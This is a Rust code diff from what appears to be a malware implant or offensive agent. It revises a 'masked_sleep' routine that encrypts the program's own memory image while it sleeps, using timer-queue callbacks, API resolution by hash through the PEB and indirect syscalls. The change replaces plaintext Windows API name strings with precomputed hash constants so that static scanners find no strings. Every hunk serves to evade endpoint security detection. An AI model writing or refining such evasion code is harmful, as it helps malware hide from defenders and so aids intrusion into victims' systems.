@@ -47,24 +47,26 @@ struct SleepCtx {
 /// Returns (create_queue, create_timer, delete_queue_ex) function pointers or None.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn resolve_rtl_timer_fns() -> Option<(usize, usize, usize)> {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::h;
     let ntdll = peb_get_module_base(djb2_hash_lower(b"ntdll.dll"));
     if ntdll.is_null() { return None; }
-    let ctq = resolve_by_hash(ntdll, djb2_hash(b"RtlCreateTimerQueue"))? as usize;
-    let ct  = resolve_by_hash(ntdll, djb2_hash(b"RtlCreateTimer"))? as usize;
-    let dtq = resolve_by_hash(ntdll, djb2_hash(b"RtlDeleteTimerQueueEx"))? as usize;
+    let ctq = resolve_by_hash(ntdll, h::RTL_CRE_TQ)? as usize;
+    let ct  = resolve_by_hash(ntdll, h::RTL_CRE_T)? as usize;
+    let dtq = resolve_by_hash(ntdll, h::RTL_DEL_TQ)? as usize;
     Some((ctq, ct, dtq))
 }
 
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn masked_sleep(duration_ms: u32) {
     use rand::RngCore;
-    use crate::evasion::syscalls::get_ssn;
+    use crate::evasion::syscalls::get_ssn_h;
+    use crate::resolve::api_hash::h;
     rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
     let image_base = get_own_image_base();
     let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
-    let (prot_ssn, prot_tramp) = get_ssn(b"NtProtectVirtualMemory").unwrap_or((0, core::ptr::null()));
-    let (qvm_ssn,  qvm_tramp)  = get_ssn(b"NtQueryVirtualMemory").unwrap_or((0, core::ptr::null()));
+    let (prot_ssn, prot_tramp) = get_ssn_h(h::NT_PROT_VM).unwrap_or((0, core::ptr::null()));
+    let (qvm_ssn,  qvm_tramp)  = get_ssn_h(h::NT_QUERY_VM).unwrap_or((0, core::ptr::null()));
 
     // RtlCreateTimerQueue(*mut isize) -> i32
     // RtlCreateTimer(queue, *mut isize, cb, param, due, period, flags) -> i32
@@ -100,7 +102,7 @@ pub unsafe fn masked_sleep(duration_ms: u32) {
     rtl_ct(timer_queue, &mut t2, sleep_callback as *const core::ffi::c_void, ctx2 as *mut core::ffi::c_void, duration_ms, 0, WT_EXEC_TIMER);
 
     let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
-    if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
+    if let Some((ssn_delay, tramp_delay)) = get_ssn_h(h::NT_DELAY) {
         crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
     }
     rtl_dtq(timer_queue, -1isize); // -1 = INVALID_HANDLE_VALUE
@@ -109,12 +111,13 @@ pub unsafe fn masked_sleep(duration_ms: u32) {
 #[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
 pub unsafe fn masked_sleep(duration_ms: u32) {
     use rand::RngCore;
-    use crate::evasion::syscalls::get_ssn;
+    use crate::evasion::syscalls::get_ssn_h;
+    use crate::resolve::api_hash::h;
     rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);
     let image_base = get_own_image_base();
     let image_size = if image_base.is_null() { 0 } else { get_image_size(image_base) };
-    let (prot_ssn, prot_tramp) = get_ssn(b"NtProtectVirtualMemory").unwrap_or((0, core::ptr::null()));
-    let (qvm_ssn,  qvm_tramp)  = get_ssn(b"NtQueryVirtualMemory").unwrap_or((0, core::ptr::null()));
+    let (prot_ssn, prot_tramp) = get_ssn_h(h::NT_PROT_VM).unwrap_or((0, core::ptr::null()));
+    let (qvm_ssn,  qvm_tramp)  = get_ssn_h(h::NT_QUERY_VM).unwrap_or((0, core::ptr::null()));
     masked_sleep_kernel32(duration_ms, image_base, image_size, prot_ssn, prot_tramp, qvm_ssn, qvm_tramp);
 }
 
@@ -123,7 +126,8 @@ unsafe fn masked_sleep_kernel32(
     duration_ms: u32, image_base: *mut u8, image_size: usize,
     prot_ssn: u16, prot_tramp: *const u8, qvm_ssn: u16, qvm_tramp: *const u8,
 ) {
-    use crate::evasion::syscalls::get_ssn;
+    use crate::evasion::syscalls::get_ssn_h;
+    use crate::resolve::api_hash::h;
     let timer_queue = CreateTimerQueue();
     let ctx1 = Box::into_raw(Box::new(SleepCtx {
         base: image_base, size: image_size, encrypt: true,
@@ -138,7 +142,7 @@ unsafe fn masked_sleep_kernel32(
     let mut t2: isize = 0;
     CreateTimerQueueTimer(&mut t2, timer_queue, Some(sleep_callback), ctx2 as _, duration_ms, 0, WT_EXEC_TIMER);
     let delay_100ns: i64 = -((duration_ms as i64 + 100) * 10_000);
-    if let Some((ssn_delay, tramp_delay)) = get_ssn(b"NtDelayExecution") {
+    if let Some((ssn_delay, tramp_delay)) = get_ssn_h(h::NT_DELAY) {
         crate::evasion::syscalls::indirect_syscall(ssn_delay, tramp_delay, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
     }
     DeleteTimerQueueEx(timer_queue, -1isize);
